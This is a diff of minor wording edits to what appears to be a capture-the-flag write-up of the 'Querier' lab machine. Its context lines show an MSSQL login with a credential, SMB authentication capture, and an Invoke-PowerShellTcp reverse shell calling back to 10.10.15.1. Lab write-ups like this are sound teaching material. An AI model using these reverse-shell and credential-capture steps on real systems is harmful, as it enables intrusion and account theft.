@@ -37,7 +37,7 @@ The first thing to do is check the connection
 to the machine with a simple +ping+ command.
 We need a stable connection
 with the box to make sure that
-we will not lose our progress.
+we will not lose all of our progress.
 
 .Ping
 [source, bash]
@@ -111,7 +111,7 @@ $ mssqlclient.py -windows-auth QUERIER/reporting:PcwTWTHRwryjc\$c6@10.10.10.125
 image::mssql-conection.png[mssql-conection]
 
 We will use this service to gain system access,
-for example as a user without privileges.
+as a user without privileges.
 We mount an +SMB+ server in our machine
 to capture the authentication of any Windows user,
 in this case, the user that executes the service +ms-sql-s+.
@@ -205,7 +205,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.1 -Port 30000
 .Invoke-PowerShellTcp code
 image::ip-shell.png[ip-shell]
 
-Then it is necessary to start an +HTTP server in our machine.
+Then it is necessary to start an +HTTP+ server in our machine.
 We can do it with +Python3+.
 
 [source, bash]
